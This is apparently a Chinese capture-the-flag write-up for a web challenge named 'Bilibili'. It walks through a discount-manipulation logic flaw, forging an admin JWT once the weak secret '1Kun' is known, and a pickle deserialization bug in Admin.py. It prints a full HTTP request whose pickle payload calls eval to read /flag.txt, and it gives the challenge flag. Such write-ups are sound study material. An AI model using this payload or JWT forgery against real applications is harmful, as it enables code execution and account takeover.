# Bilibili

## 思路分析

> 注册账号,登陆之后购买商品发现存在逻辑漏洞,折扣处可以任意修改.题目提示要购买V6的商品,用脚本翻页,在第181页发现V6的商品,商品价格很高,结合逻辑漏洞购买.购买后来到/b1g_m4mbery页面,提示只有admin用户才能访问.然后发现请求cookie中有个jwt,在https://jwt.io/解码得到明文,把用户名修改为admin,用明文发送得到报错,说明需要密钥.其实直接用c-jwt-crack爆破是比较难的,因为字典中得有这个密钥才行.密钥为1Kun.发送后成功进入,查看网页源代码,得到了网站源码,进行代码审计.

> 审计代码发现,在Admin.py中存在pickle.loads反序列化操作,那就是考察的反序列化漏洞了.用脚本构造数据包得到flag.

## payload

```
POST /b1g_m4mber HTTP/1.1
Host: 61.147.171.105:64223
Content-Length: 173
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:64223
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:64223/b1g_m4mber
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _xsrf=2|f05610cb|c084fb2705429702827c8c000f88f782|1683808730; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644; commodity_id="2|1:0|10:1683808918|12:commodity_id|8:MTYyNA==|11febe9bb1e0e93ad9a9298f3b09b7d18e5518bfaf0d594587b7139d3b51f4fc"
Connection: close

_xsrf=2%7C075c92d8%7C378e7934f248151175760e13f8827591%7C1683808730&become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Atp2%0ARp3%0A.
```

## flag

> flag{dfe54e6fe1e34f1e8fb03c8b50e963bd}

## 参考

> https://jwt.io/